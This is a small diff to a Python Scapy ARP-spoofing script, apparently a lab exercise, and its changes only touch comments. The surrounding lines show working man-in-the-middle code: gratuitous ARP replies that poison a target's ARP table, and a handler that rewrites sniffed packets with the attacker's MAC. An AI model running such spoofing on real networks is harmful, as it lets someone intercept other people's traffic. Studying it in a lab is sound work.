@@ -43,7 +43,6 @@ def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, 
 
 # TODO: spoof ARP so that dst changes its ARP table entry for src 
 def spoof(srcIP, srcMAC, dstIP, dstMAC):
-    # debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
     gratuitous_arp = ARP(op=2, psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC)
     send(gratuitous_arp)
 
@@ -57,7 +56,7 @@ def restore(srcIP, srcMAC, dstIP, dstMAC):
 def handle_packet(p):
     global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
     try:
-        if p[Ether].src == attackerMAC: # Ignore our own spoofing packages
+        if p[Ether].src == attackerMAC: # Ignore our own spoofing packets
             return;
         debug(f'Sniffed: {p.summary()}')
         p[Ether].src=attackerMAC
